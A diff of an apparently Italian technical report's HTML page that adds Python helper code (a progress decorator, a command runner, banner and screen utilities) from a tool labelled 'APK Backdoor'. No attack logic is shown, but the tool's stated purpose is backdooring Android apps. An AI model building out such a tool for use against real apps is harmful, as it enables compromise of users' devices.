+<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>
+
+
+<span class="k">def</span> <span class="nf">phase</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">phase_decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+        <span class="k">def</span> <span class="nf">function_wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">' [+] {msg}...'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
+            <span class="k">except</span> <span class="nb">BaseException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.RED}ERROR{Style.RESET_ALL}'</span><span class="p">)</span>
+                <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="n">f</span><span class="s">"{type(e).__name__} --- {str(e)}"</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">"{Fore.RED}{type(e).__name__} - {str(e)}</span><span class="se">\n</span><span class="s">"</span>
+                      <span class="s">"    To get more information about the error, take a look at the log file (apk_backdoor.log).</span><span class="se">\n</span><span class="s">"</span>
+                      <span class="s">"    You can increase the verbosity level of the log file using the --verbose option"</span><span class="p">)</span>
+                <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.GREEN}Done{Style.RESET_ALL}'</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">function_wrapper</span>
+
+    <span class="k">return</span> <span class="n">phase_decorator</span>
+
+
+<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">f</span><span class="s">"Executing command: '{command}'"</span><span class="p">)</span>
+    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">(</span>
+        <span class="s">' '</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">output</span> <span class="o">==</span> <span class="n">b</span><span class="s">''</span> <span class="ow">and</span> <span class="n">process</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="n">rc</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">rc</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">message</span> <span class="o">=</span> <span class="n">f</span><span class="s">"The command '{command}' exited with non-zero code"</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="nb">RuntimeError</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rc</span>
+
+
+<span class="k">def</span> <span class="nf">get_title</span><span class="p">(</span><span class="n">center</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">title</span> <span class="o">=</span> <span class="s">'''
+ ▄▄▄       ██▓███   ██ ▄█▀    ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄  ▒█████   ▒█████   ██▀███
+▒████▄    ▓██░  ██▒ ██▄█▒    ▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
+▒██  ▀█▄  ▓██░ ██▓▒▓███▄░    ▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
+░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄    ▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄
+ ▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄   ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
+ ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒   ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+  ▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░   ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
+  ░   ▒   ░░       ░ ░░ ░     ░    ░   ░   ▒   ░        ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░
+      ░  ░         ░  ░       ░            ░  ░░ ░      ░  ░      ░        ░ ░      ░ ░     ░
+                                   ░           ░                ░
+
+A tool developed by Andrea Esposito
+    '''</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">center</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">title</span>
+
+    <span class="k">return</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">l</span><span class="o">.</span><span class="n">center</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">title</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()])</span>
+
+
+<span class="k">def</span> <span class="nf">clear_screen</span><span class="p">():</span>
+    <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s">"cls"</span> <span class="k">if</span> <span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">()</span> <span class="o">==</span> <span class="s">"Windows"</span> <span class="k">else</span> <span class="s">"clear"</span><span class="p">,</span>
+                    <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">resize_screen</span><span class="p">(</span><span class="n">rows</span><span class="o">=</span><span class="mi">40</span><span class="p">,</span> <span class="n">cols</span><span class="o">=</span><span class="mi">120</span><span class="p">):</span>
+    <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
+        <span class="n">f</span><span class="s">'mode con: cols={cols} lines={rows}'</span> <span class="k">if</span> <span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">()</span> <span class="o">==</span> <span class="s">"Windows"</span> <span class="k">else</span> <span class="n">f</span><span class="s">'resize -s {rows} {cols} &gt; /dev/null'</span><span class="p">,</span>
+        <span class="n">shell</span><span class="o">=</span><span class="bp">True</span>
+    <span class="p">)</span></code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
 <h2 id="_riferimenti">Riferimenti</h2>
 <div class="sectionbody">
 <div class="ulist bibliography">
@@ -740,7 +1599,7 @@ URL: <a href="https://www.digitalmusicnews.com/2018/03/26/spotify-piracy-hacked/
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2020-02-23 15:11:51 +0100
+Last updated 2020-02-24 13:21:57 +0100
 </div>
 </div>
 <style>
